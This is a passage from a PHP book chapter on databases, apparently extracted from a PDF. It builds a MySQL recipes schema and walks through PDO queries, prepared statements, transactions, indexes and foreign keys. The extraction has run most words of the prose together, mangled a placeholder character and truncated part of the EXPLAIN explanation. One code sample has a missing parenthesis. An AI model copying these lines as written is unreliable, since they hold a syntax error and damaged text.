Wehave four main options forstoring data:
1.Textfiles These areideal forsmall amounts ofdata thatare
updated infrequently (such asconfiguration files),
andforlogging events orerrors inyour application.
2.Session data Fordata thatisonly needed forthenext request or
fortheduration ofthisvisit, wecanstore informa-
tionintheuser’ ssession. Using thesession fortem-
porary data isideal, asitsaves usfrom potentially
recording toomuch data, orhaving toaddfunction-
ality toclean updata that’snolonger needed.PHP Master: W rite Cutting-edge Code 40
www.it-ebooks.info
3.Relational database This isthemain type ofstorage we’ll becovering in
thischapter ,along with how toaccess data using
PDO. Relational databases areperfect fordata which
isofaknown structure, such astables containing
users (who will allhave anID,afirst name, alast
name, awebsite URL, andsoon).
4.NoSQL database TheNoSQL (generally agreed tostand for“Not Only
SQL”) databases areanestablished setofalternative
database technologies, such asCouchDB,1Mon-
goDB,2andCassandra.3These arebestused fordata
ofanunknown orflexible structure; they were ori-
ginally designed forstoring documents thatdiffer
greatly from oneanother .
Aswe’ve stated, thischapter will focus onrelational databases—they areanatural
partner toPHP intoday’ sweb applications.
Building a Recipe W ebsite with MySQL
Inourexample, we’re going tobuild arecipe website presenting dynamic content
totheuser.First, we’ll need tocreate adatabase; let’scallit“recipes.” Next, wecan
create acouple oftables with which topopulate ourdatabase andcontain thecontent
oursitewillpresent. Forastart, let’shave atable tohold allourrecipes, andanother
onecontaining recipe categories. Figure 2.1gives apicture ofhow ourbasic table
structure will look.
1http://couchdb.apache.org/
2http://www .mongodb.org/
3http://cassandra.apache.org/41 Databases
www.it-ebooks.info
Figur e 2.1. A basic r elationship diagr am between our fir st two tables
Each recipe willbelong inonecategory ,sowegive thecategory aunique IDcolumn,
andrefer toitfrom therecipes column. (Wewill look inmore detail atdesigning
databases later inthischapter .)
Creating the T ables
Here aretheSQL commands thatwill generate thetables. Youcantype them into
theMySQL command line, oruseagraphical toolsuch asphpMyAdmin,4where
youcanenter thefollowing under theSQLtab:
CREATE TABLE recipes (
  id INT PRIMARY KEY AUTO_INCREMENT,
  name VARCHAR( 400 ) NOT NULL,
  description TEXT,
  category_id INT,
  chef VARCHAR(255),
  created DATETIME);
CREATE TABLE categories (
  id INT PRIMARY KEY AUTO_INCREMENT,
  name VARCHAR( 400 ) NOT NULL);
You’ll notice thatwe’ve given idcolumns toboth tables, andmarked them asprimary
keys .Itisgood practice toprovide aunique identifier within atable—so thatwe
have aneasy way tofind aparticular record—and adding aprimary keyvalue toa
4http://www .phpmyadmin.net/PHP Master: W rite Cutting-edge Code 42
www.it-ebooks.info
column will take care ofthis. Here, we’ve added aunique number asanid,which
makes iteasy forMySQL tohunt down therecord we’re looking for.
Analternative approach istoaddaunique constraint ononecolumn andmake that
theprimary key.Forexample, wecould have said thattherecipe.name column must
beunique. Withaunique name column, there’ snoneed foranidcolumn atall,as
we’ll identify ourrecords purely bytheir name. Itdoes mean, however ,thatchanging
therecipe name will cause aproblem, especially ifother tables usethiscolumn to
refer toparticular records. Using strings tomatch keys isabitslower than using
numeric ids,which iswhy it’scommon practice tohave acolumn with anint(integer)
value astheprimary key,andthen adding anauto_increment value toit,likethe
ones used inthese examples. (We’llexplain auto incrementation shortly .)
Thetables we’ve created provide some structure, butwecanalso enter some data
intothem togetusstarted. Wehope thefood-related examples won’t make youfeel
toohungry!
INSERT INTO categories (name) values ('Starter');
INSERT INTO categories (name) values ('Main');
INSERT INTO categories (name) values ('Pudding');
Wedefined ourcategories table with twocolumns— idand name —but we’re only
supplying oneofthem inourINSERT statements: name .Sowhat’ shappening here?
Infact, thisistheauto_increment value going towork thatwespecified when we
created thetable. Even though wehaven’t supplied avalue fortheidcolumn, MySQL
will automatically apply aunique number tothiscolumn, increasing thatnumber
with each new rowthat’screated.5
When thetable isnewly built, thefirst value togointo thiscolumn will be1.The
next value will be2,andsoon.However ,thecurrent highest number isactually
stored asatable property .Youmight, forinstance, insert fiverows into thetable;
MySQL willgive them idvalues of1,2,3,4,and5.Atsome point, youcould decide
youdon’t need them andremove them all;then, atalater point, insert more rows
into what would beanempty table. These new rows will begin with anidvalue of
6because thetable remembers what number itwasuptobefore youdeleted that
5There areequivalents toauto_increment inmost other database platforms.43 Databases
www.it-ebooks.info
firstsetofrows. This isauto incrementation atwork, andwecanseethisautomatic
numbering inaction again when weaddrows totherecipes table:
INSERT INTO recipes (name, description, category_id, chef, created) 
  values ('Apple Crumble', 'Traditional pudding with crunchy crumble 
  layered over sweet fruit and baked', 3, 'Lorna', NOW());
INSERT INTO recipes (name, description, category_id, chef, created) 
  values ('Fruit Salad', 'Combination of in-season fruits, covered 
  with fruit juice and served chilled', 3, 'Lorna', NOW());
These queries usetheNOW() function inMySQL toinsert thecurrent date andtime
into atable column; inthiscase, ourcreated column. When wework with PHP,we
canusethishandy automatic toolinstead ofmanually formatting thedate andtime
data topass intoourqueries.
PHP Database Objects
Ifyou’ve used PHP with MySQL before, youmay have used themysql ormysqli
libraries toconnect toyour database, using functions such asmysql_connect() .
Formany years, thiswasastandard way ofconnecting toMySQL databases, and
there were equivalents forother database platforms.
These libraries were used directly andformed thebasis oflibraries andframeworks
forcountless PHP applications. Thedisadvantage wasthateach extension differed
slightly from theothers, somaking code thatcould easily move between database
platforms wastricky .Although those database-specific libraries arestillactive and
well-maintained, thischapter will focus onusing themore modernPDOextension.
ThePDOextension wascreated togive usaunified setoffunctionality when talking
todatabase platforms ofallkinds. It’sanobject oriented extension thatwasintro-
duced with PHP 5,taking advantage ofmany features introduced intothelanguage
atthattime.
Know Y our OOP
Ifyou’re new toobject oriented coding, andyou’re yettoread through Chapter 1,
now isagood time tocheck itoutformore information onusing thisapproach.
One problem notsolved byPDO,however ,isthedifference inSQL syntax thatoccurs
between different database platforms; hence, thisextension isnotquite thesilverPHP Master: W rite Cutting-edge Code 44
www.it-ebooks.info
bullet thatitcanseem upon firstglance.PDOwillconnect andtalktoanassortment
ofdatabase platforms, butwemay stillhave toadapt theSQL thatwesend inorder
tomake atruly platform-independent application.
PDO isanabstraction layer ,meaning it’sbuilt between thePHP wewrite andthe
way PHP connects tothedatabases. Itgives ussome very elegant functionality for
performing queries anditerating over data sets. Let’sinvestigate thetechnical details
ofhow tousePDO.
Connecting to MySQL with PDO
Weconnect todatabases withPDObyinstantiating anewPDOobject andpassing in
aDSN, plus theuser name andpassword, ifneeded. DSN (Data Source Name)
consists ofthedata structures used todescribe theactual connection. Toconnect
tothedatabase wecreated (named recipes ,using localhost asthehost), theconnection
would bemade using thefollowing PHP code:
$db_conn = new PDO('mysql:host=localhost;dbname=recipes', ➥
  'php-user', 'secret');
Remember toreplace thevalues inthiscode with your own username andpassword.
Here we’re usingphp-user andsecret ,respectively; ifyou’ve setupalocal server
environment with software such asXampp these values might bydefault besetto
root andhave nopassword value. Alternatively ,youmay have changed them when
youinstalled andconfigured your server environment.
IfPHP canconnect tothedatabase, there willbeashiny newPDOobject now stored
inthe$db_conn variable. IfPHP isunable toconnect, thePDOobject creation fails,
andcauses aPDOException tobethrown. OurPDOcode should therefore wrap the
connection step inatry/catch block, andlook forPDOException objects thatwould
indicate wefailed toconnect:
chapter_02/PDOException.php
try { 
  $db_conn = new PDO('mysql:host=localhost;dbname=recipes', ➥
   'php-user', 'secret');
} catch (PDOException $e) {
  echo "Could not connect to database";
}45 Databases
www.it-ebooks.info
Selecting Data fr om a T able
WiththePDOobject created, wecannow retrieve data. Tostart with, how about a
listoftherecipes inourdatabase? When weselect data withPDO,wecreate a
PDOStatement object. This represents ourquery ,andallows ustofetch results. For
abasic query ,wecanusethePDO::query() method:
chapter_02/PDOStatement.php
$db_conn = new PDO('mysql:host=localhost;dbname=recipes', ➥
  'php-user', 'secret');
// perform query
$stmt = $db_conn->query( 'SELECT name, chef FROM recipes');
// display results
while($row = $stmt-> fetch()) {
  echo $row['name'] . ' by ' . $row['chef'] . "\n";
}
Using ORDER to Sort Results
When selecting data from MySQL thisway,we’ll have therecords returned inan
undefined order; usually ,thiswill betheorder they were inserted in.Foramore
polished application, wemight addthefollowing command totheendofour
query:ORDER BY created DESC .This will return theresults indescending
chronological order ,andmeans we’ll always seethenewest recipes first.
Theexample above made useofthePDOStatement::fetch() method, which can
handle anumber ofmodes forfetching data.
Data Fetching Modes
Intheprevious example, wesawhowPDOStatement isused torepresent ourquery
anditsdataset. Each time wecallthefetch() method, wereceive another rowfrom
theset.Wecanalso usefetchAll() toretrieve alltherows atonce. Both methods
accept thefetch_style argument, which defines how theresult setisformatted.
PDO provides uswith some handy constants tousewith this:PHP Master: W rite Cutting-edge Code 46
www.it-ebooks.info
■PDO::FETCH_ASSOC does what youseeinthewhile loop previously; itreturns
anarray with thekeys settothecolumn names.
■PDO::FETCH_NUM also returns anarray ,butthistime with numeric keys.
■PDO::FETCH_BOTH (thedefault value) combines bothPDO::FETCH_ASSOC and
PDO::FETCH_NUM togiveanarray thathasevery value twice—once with itscolumn
name andonce with anumeric index.
■PDO::FETCH_CLASS returns anobject ofthenamed class instead ofanarray ,with
thevalues setinto properties named after thecolumns.
Toseetheresults returned by,say,PDO::FETCH_ASSOC ,type inthefollowing code:
$result = $stmt->fetch(PDO::FETCH_ASSOC);
print_r($result);
Youshould seeanarray returned onscreen with thekeys ascolumn names andthe
values ascorresponding column entries.
Which ofthese constants youusedepends onyour application, butknowing that
youcandiversify tofityour needs isimportant. Itisquite common tousethedefault
andaccess thearray elements with thecolumn names.
Parameters and Pr epared Statements
InourfirstPDOexample, wesimply selected alltherows from atable. Itismore
common, though, tofetch aspecific record, oralistofresults matching some criteria.
Let’sfetch details oftheparticular recipe thathasanidof1.
Todothis, we’ll useaprepared statement .This istosaywe’ll tellMySQL what
thestatement isgoing tobeandwhich parts ofitarevariable. Then weaskMySQL
toactually execute thestatement, using thevariable(s) wesupply .Infact, when we
runPDO::query() ,itcombines theprepare andexecute steps forus,asthere’ sno
need todothem separately .Here’ stheexample code:
chapter_02/prepared_statement.php
$db_conn = new PDO('mysql:host=localhost;dbname=recipes', ➥
  'php-user', 'secret');47 Databases
www.it-ebooks.info
// query for one recipe
$sql = 'SELECT name, description, chef 
        FROM recipes
WHERE id = :recipe_id';
$stmt = $db_conn->prepare($sql);
// perform query
$stmt->execute(array(
  "recipe_id" => 1)
);
$recipe = $stmt->fetch();
There areafewactivities going onhere, solet’slook atthem inturn.
First, wecreate thePDOStatement bypassing theSQL into theprepare() method.
Look closely atthisSQL andyoumight seesomething abitodd. Thecolon infront
of:recipe_id indicates thatthisisaplaceholder ;we’ll replace theplaceholder
with arealvalue before weactually runthisquery .
Then weexecute() thequery .When wedothis, wemust pass invalues foreach
oftheplaceholders inthestring wepassed totheprepare() method. Since we’re
using named placeholders, wecreate anarray with asmany elements asthere are
placeholders. Each placeholder hasamatching array element with itsname asthe
key,andthevalue wewant tousetoreplace it.
Since weknow there willonly beonerowreturned, wecancallfetch() once instead
oflooping.
Building the SQL Statement
Intheprevious example, wedefined aseparate$sql variable tohold thestring
topass intoPDO::prepare .This approach canmake iteasier toread thecode,
andhelps ifyouneed tobuild amore complex query .Itcanalsoaidindebugging,
asyoucaneasily check what waspassed intoprepare() .
Placeholders don’t need tohave names—you canalso usethe??character tohold
theplace foravariable asanunnamed placeholder .Again, there canbemany of
these intheSQL thatyouusetocreate thePDOStatement ,andwepass thevaluesPHP Master: W rite Cutting-edge Code 48
www.it-ebooks.info
intoexecute() asanarray ,butinthiscase, listing thevalues intheorder they appear
inthequery .It’seasier toillustrate thiswith anexample:
// fetch all pudding recipes from Lorna
$sql = 'SELECT name, description, chef
        FROM recipes
        WHERE chef = ?
        AND category_id = ?';
$stmt = $db_conn->prepare($sql);
// perform query
$stmt->execute(array("Lorna", 3);
$recipe = $stmt->fetch();
Ifyour queries become large orcomplex, named placeholders canmake iteasier to
maintain your code. Thenamed keys inthearray passed toexecute() make it
simpler toseewhich value belongs with which parameter ,than when dealing with
alarge, numerically indexed array .
Prepared statements allow ustovery clearly mark outwhich parts ofthequery are
database language, andwhich contain variable data. Youwillhave heard thesecurity
mantra “Filter Input, Escape Output” (and ifnot,yousoon willinChapter 5).When
working with databases, wemust escape values (that is,removed unwanted charac-
ters) thatarebeing sent tothedatabase. Youmay have seen theMySQL functions
forthis, such asmysql_escape_string() .When wework with prepared statements,
thevalues wepass infortheplaceholders will already beescaped, since MySQL
knows these arevalues thatmight change. This added level ofsecurity isacompel-
lingreason forusingPDOandprepared statements asstandard.
Binding V alues and V ariables to Pr epared Statements
Once MySQL hasprepared aquery ,there’ sonly minimal overhead inrunning that
query again with different values. We’ve seen how wecanpass invariables tothe
execute() method ofaPDOStatement .Inthissection, we’ll seehow wecanbind
values andeven variables toastatement, sothey will beused every time itisex-
ecuted.49 Databases
www.it-ebooks.info
Simple Examples to Illustr ate Concepts
These examples might seem rather trivial, butthat’sthejoyoftrying toillustrate
more advanced techniques onasimple dataset! Ifyoufind yourself asking, “Why
would Iwant toattempt anyofthis?”, trytoremember thatthese aretechniques
foryoutocustomize inyour own projects (and possibly inmore complex settings).
While itistrue that, ingeneral, it’sbetter toretrieve data from adatabase inasfew
steps aspossible, sometimes thenature ofthequeries youusemean they can’t be
combined. When wecallthesame query repeatedly with different values, wecan
setsome elements thatwill beused every time.
Asanexample, ifwealways want thesame chefvalue tobeused, wecanuse
PDOStatement::bindValue() :
chapter_02/bind_value.php
$db_conn = new PDO('mysql:host=localhost;dbname=recipes', ➥
  'php-user', 'secret');
$sql = 'SELECT name, description 
        FROM recipes
        WHERE chef = :chef
        AND category_id = :category_id';
$stmt = $db_conn->prepare($sql);
  
// bind the chef value, we only want Lorna's recipes
$stmt->bindValue(':chef', 'Lorna');
// starters
$stmt->bindValue(':category_id', 1);
$stmt->execute();
$starters = $stmt->fetch();
// pudding
$stmt->bindValue(':category_id', 3);
$stmt->execute();
$pudding = $stmt->fetch();
How about taking thisonestep further? Wecanalso bind parameters tovariables.
Every time thestatement isexecuted, thevalue ofthevariable atthatpoint intimePHP Master: W rite Cutting-edge Code 50
www.it-ebooks.info
willbepassed inforthatplaceholder .Here’ salittle demonstration using theprevious
example, butadding aJOIN into theSQL andbinding thecategory parameter with
PDOStatement::bindParam() :
chapter_02/bind_parameter .php
$db_conn = new PDO('mysql:host=localhost;dbname=recipes', ➥
  'php-user', 'secret');
// query for one recipe
$sql = 'SELECT recipes.name, recipes.description, categories.name ➥
          as category
        FROM recipes
        INNER JOIN categories ON categories.id = recipes.category_id
        WHERE recipes.chef = :chef
        AND categories.name = :category_name';
$stmt = $db_conn->prepare($sql);
  
// bind the chef value, we only want Lorna's recipes
$stmt->bindValue(':chef', 'Lorna');
$stmt->bindParam(':category_name', $category);
// starters
$category = 'Starter';
$stmt->execute();
$starters = $stmt->fetchAll();
// pudding
$category = 'Pudding';
$stmt->execute();
$pudding = $stmt->fetchAll();
These lasttwoexamples have shown how wecansetvariables orvalues ona
PDOStatement before callingexecute() .Whether youusebindValue() ,bindParam() ,
orpass invalues toexecute() itself, prepared statements areincredibly useful!
They improve performance ofthecode ifwerunthestatement multiple times, and
theplaceholders areimplicitly escaped.51 Databases
www.it-ebooks.info
Inserting a Row and Getting Its ID
Sowe’ve examined theoptions forSELECT statements indepth, butwhat aboutIN-
SERT andUPDATE statements? These actually look fairly similar—we prepare and
execute astatement. Let’sinsert some new recipes asanexample:
chapter_02/insert.php
$db_conn = new PDO('mysql:host=localhost;dbname=recipes', ➥
  'php-user', 'secret');
// insert the new recipe
$sql = 'INSERT INTO recipes (name, description, chef, created)
        VALUES (:name, :description, :chef, NOW())';
$stmt = $db_conn->prepare($sql);
// perform query
$stmt->execute(array(
  ':name' => 'Weekday Risotto',
  ':description' => 'Creamy rice-based dish, boosted by in-season ➥
    ingredients. Otherwise known as \'raid-the-fridge risotto\'',
  ':chef' => 'Lorna')
 );
echo "New recipe id: " . $db_conn->lastInsertId();
Weexecute theINSERT statement, andwecanimmediately grab theIDofthenew
record bycallinglastInsertId() onthedatabase connection itself (note thatit’s
thePDOobject andnotthePDOStatement ).This approach works across allthe
common database platforms where auto_increment oranequivalent issupported—not
justforMySQL.
How many r ows wer e inserted, updated, or deleted?
When weperformINSERT ,UPDATE ,orDELETE statements, wecanalso find outhow
many rows were changed. Todothis, weusetherowCount() method. Here’ san
example where weinserted afewmore records using theapproach above, then
realized weforgot tosetthecategories forthisdata! Wesimply update therows,
andthen check how many were changed:PHP Master: W rite Cutting-edge Code 52
www.it-ebooks.info
chapter_02/row_count.php
$db_conn = new PDO('mysql:host=localhost;dbname=recipes', ➥
  'php-user', 'secret');
// update to add the categories where we forgot
$sql = ' UPDATE recipes SET category_id = :id
        WHERE category_id is NULL';
$stmt = $db_conn->prepare($sql);
// perform query
$stmt->execute(array(':id' => 2));
echo $stmt->rowCount() . ' rows updated';
TherowCount() isamethod ofPDOStatement ,andwilltellushow many rows were
affected bythequery .
Deleting Data
Wedelete data inthesame way asweinsert orupdate data—preparing thequery
andthen executing it.Ifwewanted toremove the“Starter” category (asit’sunused),
wecould simply do:
chapter_02/delete.php
$db_conn = new PDO('mysql:host=localhost;dbname=recipes', ➥
  'php-user', 'secret');
$stmt = $db_conn->prepare('DELETE FROM categories WHERE ➥
  name = :name');
// delete the record
$stmt->execute(array(':name' => 'Starter'));
echo $stmt->rowCount() . ' row(s) deleted';
Again, wecanuse$stmt->rowCount() tocheck thatthere were rows deleted—and
only asmany aswewere expecting (many amissing orincorrect WHERE clause has
done more damage than expected).53 Databases
www.it-ebooks.info
Dealing with Err ors in PDO
One aspect thatcanbeeither surprising orfrustrating (depending onyour attitude)
when youstart working withPDOisthatwhen things gowrong, itisn’t always obvi-
ous. When wefirst connected tothedatabase, wesawthatafailed connection will
cause anexception tobethrown. Here’ sareminder ofthatcode:
try { 
  $db_conn = new PDO('mysql:host=localhost;dbname=recipes', ➥
   'php-user', 'secret');
} catch (PDOException $e) {
  echo "Could not connect to database";
}
Ingeneral,PDOwillthrow exceptions when something show-stopping happens, but
ifyour query fails torunforanyreason, itwon’t make much fuss about it.This
means thatit’simportant totake care tocheck thateverything isproceeding aswe
think itshould.
Let’swalk through what wehave sofar,andlook athow toidentify andreact toa
situation where something hasgone wrong.
Handling Pr oblems When Pr eparing
When wecallPDO::prepare() ,thisfunction should return usaPDOStatement object.
Beaware, though, thatiftheprepare hasfailed, itmay either return false orthrow
aPDOException .Therefore, ourcode should really bewrapped likethis:
chapter_02/error_handling.php
try { 
  $db_conn = new PDO('mysql:host=localhost;dbname=recipes', ➥
   'php-user', 'secret');
} catch (PDOException $e) {
  echo "Could not connect to database";
  exit;
}
$sql = 'SELECT name, description, chef 
        FROM recipes
        WHERE id = :recipe_id';PHP Master: W rite Cutting-edge Code 54
www.it-ebooks.info
try {
  $stmt = $db_conn->prepare($sql);
  
  if($stmt) {
    // perform query
    $stmt->execute(array(
      "recipe_id" => 1)
    );
    $recipe = $stmt->fetch();
  }
} catch (PDOException $e) {
  echo "A database problem has occurred: " . $e->getMessage();
}
Bychecking that$stmt isnotfalse, wecover thecase where theprepare() callre-
turned false. Inaddition, ifanexception occurs atanystage inourprocess ofprepare,
execute, andfetch, itwill now becaught andhandled elegantly .
This example uses thegetMessage() method, which gives youinformation about
what caused theexception tobethrown. There’ smore information about working
with exceptions inChapter 1.
Handling Pr oblems When Executing
Once wehave ourPDOStatement ,andwehave bound anyvalues orparameters that
weneed to,wecanexecute it.Theexecute() function returns true ifsuccessful
andfalse otherwise, soitwould bebest forustocheck thateverything iscorrect
before wetrytofetch anyresults.
Atypical example would look likethis:
chapter_02/error_execute.php
try { 
  $db_conn = new PDO('mysql:host=localhost;dbname=recipes', ➥
   'php-user', 'secret');
} catch (PDOException $e) {
  echo "Could not connect to database";
  exit;
}55 Databases
www.it-ebooks.info
$stmt = $db_conn->prepare($sql);
if($stmt) {
  // perform query
  $result = $stmt->execute(array(
    "recipe_id" => 1)
  );
  
  if($result) {
    $recipe = $stmt->fetch();
    print_r($recipe);
  } else {
    $error = $stmt->errorInfo();
    echo "Query failed with message: " . $error[2];
  }
}
Notice thatweassign theresult oftheexecute() call, sothatwecancheck ifitis
trueorfalse. Ifitistrue, wegoahead andproceed with fetching thedata, orwhatever
wewere going todonext.
However ,iftheexecute() hasfailed,PDOwon’t spoon-feed usanyexplanations!
Instead wemust proactively askforinformation about what went wrong, using the
errorInfo() method. This returns anarray with three elements:
1.SQLST ATE—an ANSI SQL standard code forwhat went wrong
2.error code from thedatabase driver
3.error message from thedatabase driver
Intheexample, we’re using thethird element: theerror message. This istheerror
youwould seeifyouranthequery manually against thedatabase using thecommand
line, phpMyAdmin, oranyequivalent tool. Certainly during thedevelopment phase,
thisisthemost useful information available.
Handling Pr oblems When Fetching
Ifwecansuccessfully calltheexecute() method, wehave overcome most ofthe
challenges. Butifsomething should gowrong when callingfetch() ,thismethod
will return false. Youcanchoose whether itisbest foryoutocapture andtestthe
return value inyour database code, orwhether your application will handle thePHP Master: W rite Cutting-edge Code 56
www.it-ebooks.info
situation where false isreturned. Asbefore, there will beinformation about any
errors available inthearray returned byPDOStatement::errorInfo() .
Thefetch() method canalso return empty arrays (orequivalent, depending on
your fetch mode, aswelooked atinthesection called “Data Fetching Modes” ),and
there willbenoerror state todetect here. Theempty array simply means thatthere
were norecords matching your query .
Advanced PDO Featur es
We’ve already looked atthefunctions thatwill make upthemain body ofany
database-driven PHP application. However ,PDOhasacouple ofother nice tricks
upitssleeve thatweshould also examine. Thenext couple ofsections show how
wecantakeadvantage oftransactions indatabases, andhow tocallstored procedures
from ourPHP code.
Transactions and PDO
Atransaction indatabase terms isacollection ofstatements thatmust beexecuted
asagroup. Either they must allcomplete successfully ,ornone ofthem canberun.
Notalldatabases support transactions; some do,some don’t, andsome canbecon-
figured todoso.ForMySQL, transaction support isunavailable forsome table types.
Ifthedatabase hasnosupport fortransactions, PDOwill pretend thattransactions
aretaking place successfully ,sobeware ofunexpected results inthisscenario.
Tousetransactions, wedon’t need tomake many changes toourcode. Ifwehave
aseries ofSQL statements thatwill make upatransaction, wesimply need to:
1.initiate thetransaction bycallingPDO::beginTransaction() before anystatements
arerun
2.callPDO::commit() when allstatements have been runsuccessfully
3.cancel thetransaction ifsomething goes wrong bycallingPDO::rollback() ;this
will undo anystatements thathave been runalready
Sohow does thatlook incode?57 Databases
www.it-ebooks.info
chapter_02/transaction.php
try { 
  $db_conn = new PDO('mysql:host=localhost;dbname=recipes', ➥
   'php-user', 'secret');
} catch (PDOException $e) {
  echo "Could not connect to database";
  exit;
}
try {
  // start the transaction
  $db_conn->beginTransaction();
  $db_conn->exec('UPDATE categories SET id=17 WHERE ➥
    name = "Pudding"');
  $db_conn->exec('UPDATE recipes SET category_id=17 WHERE ➥
    category_id=3');
  // we made it!
  $db_conn->commit();
} catch (PDOException $e) {
  $db_conn->rollBack();
  echo "Something went wrong: " . $e->getMessage();
}
Youcanusetherollback functionality from anywhere. Forexample, youmight
want torollback ifthere norows were updated. Thecorrect time tousethese
functions depends entirely ontheapplication you’re building.
exec()  and Return V alues
Theexample above usesexec() torunone-off statements against adatabase. The
return value ofexec() will beeither thenumber ofaffected rows, orfalse ifthe
query fails. Bevery careful when checking return values toyouusethecomparison
operator===toestablish ifsomething isfalse, andtodistinguish between afalse
return value andzero-affected rows.
Transactions areparticularly useful inhighly information-critical applications.
Traditionally ,weseethem used inareas such asbanking. Ifthemoney comes out
ofoneaccount, itmust gointo another ,ornotcome outofthatfirst account atall!
Transactions enable such systems towork inareliable andfail-safe manner .UsingPHP Master: W rite Cutting-edge Code 58
www.it-ebooks.info
transactions ismuch easier than trying tounpick what queries wewould have run
intheevent there’ sanerror .
Stored Procedur es and PDO
Some database platforms also support stored procedures ,which aresimilar to
functions, butstored atthedatabase level. They may optionally takesome parameters
when called, andweuseplaceholders intheprepared statement aswe’ve done be-
fore. Toillustrate anexample, let’screate asimple stored procedure:
delimiter $$ 
CREATE PROCEDURE get_recipes() 
BEGIN 
  SELECT name, chef
  FROM recipes
  ORDER BY created DESC ;
END $$
delimiter ;
While stored procedure theory isbeyond thescope ofthisbook, there areafew
features here thatbear closer examination. First, thechange indelimiter ,which by
default issettoasemicolon. We’llwant tousethesemicolon between ourSQL
statements inside theprocedure, sowesetittoadifferent character combination
while wecreate theprocedure, andthen setitback again. This code isforMySQL,
butwecallstored procedures fordifferent platforms inthesame way,soyoucould
usethisexample formost other options:
$db_conn = new PDO('mysql:host=localhost;dbname=recipes', ➥
  'php-user', 'secret');
$stmt = $db_conn->query('call get_recipes()');
$results = $stmt->fetchAll();
Stored procedures areactually quite alarge topic; ifyouwant toknow more about
them, have alook atthePHP Manual page forstored procedures.6They canbean
extremely useful way ofcontaining application logic atthedatabase level, should
youneed to.
6http://php.net/manual/en/pdo.prepared-statements.php59 Databases
www.it-ebooks.info
Designing Databases
Sofar,we’ve created twovery basic tables andlooked athow tooperate onsimple
data withPDO.We’llnow extend ourexample toincorporate some additional tables,
andinvestigate how we’d work with thisdata inarealapplication. Let’sstart off
bytaking alook atwhat wehave sofarinFigure 2.2.
Figur e 2.2. Our table setup so far: categories and r ecipes
This figure shows ourtwotables linked byaone-to-many relationship. This means
thatevery record inthecategories table may have many related records intherecipes
table; thatis,acategory may have many recipes, butarecipe canonly belong toone
category .
Primary K eys and Indexes
We’ve added primary keys toboth tables, giving usacolumn that’sguaranteed to
beunique ineach table, sothatwecanrefer toaparticular record easily .Asanadded
benefit, MySQL will also place anindex onthiscolumn. Adding anindex toa
database column islikeasking thedatabase tokeep track ofitscontents. Ifyouadd
anindex ontherecipes.name column, forexample, thedatabase will easily beable
tofind items using thatcolumn, because itknows tokeep atrack ofwhere those
records are.
MySQL Explain
One final database tactic thatweshould look atistheMySQLEXPLAIN command.
EXPLAIN details how MySQL will runthequery .Weuseitbysimply placing the
termEXPLAIN immediately before ourSELECT query:PHP Master: W rite Cutting-edge Code 60
www.it-ebooks.info
EXPLAIN SELECT name, chef, created
FROM recipes
WHERE name = 'Chicken Casserole'
Ifyourunthisquery ,you’ll seethatMySQL returns awhole bunch ofcolumns.
Thecolumns we’re most interested inare:
Indicates what kind ofSELECT wasrun.
key Tellsustheindex thatwasused forSELECT ,with alltheones thatapply
listed inthepossible_keys column.
rows This isreally important, because ittells ushow many data
Soifwelook atthese figures intheoutput oftheEXPLAIN plan from before, wesee
acolumn layout likeTable 2.1.
Table 2.1. MySQL Returns Information About How It Will Run a Query
1 id
SIMPLE select_type
recipes table
ALL type
possible_keys
key
key_len
ref
5 rows
Using wher e Extra
This shows thatourquery hadtosearch allfiverows tofind theonerowwewere
looking for.Five rows isn’t alot,butinthiscase itisevery rowinthetable, and
that’salways badnews! Ifwe’re going tobequerying forrows byrecipe name regu-
larly,wecanaddanindex toimprove performance.
Toaddanindex, weusetheALTER TABLE statement. Sotoaddanindex onre-
cipes.name ,wewould input:61 Databases
www.it-ebooks.info
ALTER TABLE recipes ADD INDEX idx_name( name );
Withthisindex inplace, wecanrerun theEXPLAIN plan onthesame query ,and
compare theresults inTable 2.2.
Table 2.2. MySQL Output with an Index Added
1 id
SIMPLE select_type
recipes table
ref type
idx_name possible_keys
idx_name key
402 key_len
const ref
1 rows
Using wher e Extra
Thetable shows thatwe’re now making useofournew index, andthatweonly had
tosearch onerowtofind ouronerow.That’ safineratio! It’salsoagood illustration
ofwhat theEXPLAIN plan does, andwhy weneed indexes oncolumns inourtables
thatoften show upinourWHERE clauses. Beaware, though, thatMySQL only uses
oneindex atatime tooptimize SELECT statements, sothere’ slittle value inadding
indexes onevery column.
Foreign K eys
Indatabase structure terms, wecanenforce theone-to-many relationship byadding
aforeign keytoourtable definition. Theforeign keymeans thatwecanonly enter
values inthecategor y_idcolumn intherecipes table where thatvalue already exists
intheidcolumn ofthecategories table. Or,insimple terms, recipes must belong to
anexisting category—which makes perfect sense.
Creating theforeign keymakes ourtable creation statement look likethis:PHP Master: W rite Cutting-edge Code 62
www.it-ebooks.info
CREATE TABLE recipes (
  id INT PRIMARY KEY AUTO_INCREMENT,
  name VARCHAR( 400 ) NOT NULL,
  description TEXT,
  category_id INT,
  chef VARCHAR(255),
  created DATETIME,
  FOREIGN KEY ( category_id ) REFERENCES categories( id )
);
This means thatifwetrytoinsert arecord intotherecipes table with anidof4,we’ll
seeanerror message.
Foreign K ey Support
Beaware thatnotalldatabases support foreign keys. MySQL does, butonly with
InnoDB table types. WithaMyISAM table type, youcancreate aforeign key,butit
will justbeignored! InphpMyAdmin, theoption toselect anInnoDB table type
canbefound inthedrop-down menu titled Storage Engine when youcreate atable.
Handling Many-to-Many Relationships
Wehave avery manageable andtidy interface with ourtwoexisting tables, butit
hardly makes foragreat recipes website! Toimprove it,let’saddatable tohold the
ingredients needed foreach recipe.
Yourfirst instinct might betodeduce thateach recipe hasmany ingredients, and
weknow how tohandle data inthatformat. Butactually ,each ingredient might
appear inmany recipes; forexample, many ofthemeals cooked atdinnertime might
include atinoftomatoes. Tobeable torepresent theingredients foreach recipe,
andtherecipes using each ingredient, we’ll need tocreate alinking table. This is
literally atable tolink twoother tables, where records from both arepaired upand
canappear asmany times asdesired. We’llcreate atable tohold theingredients,
andanother table tolink thetwo:
CREATE TABLE ingredients(
  id INT PRIMARY KEY AUTO_INCREMENT,
  item VARCHAR( 400 ) NOT NULL
);63 Databases
www.it-ebooks.info
CREATE TABLE recipe_ingredients(
  recipe_id INT NOT NULL,
  ingredient_id INT NOT NULL
)
Asyoucansee,they’re quite simple; wemight addmore detail totheingredients
table later onifweneed to.Thelinking table, recipe_ingredients ,isempty apart from
acolumn foreach table. This isfairly common, although anyinformation specific
tothecombination ofingredient andrecipe could also beadded here (such asthe
quantity oftheitem required bythisrecipe). Thedatabase relationships aredepicted
inFigure 2.3.
Figur e 2.3. Our database schema with recipe_ingredients  linking the recipes  and ingredients  tables
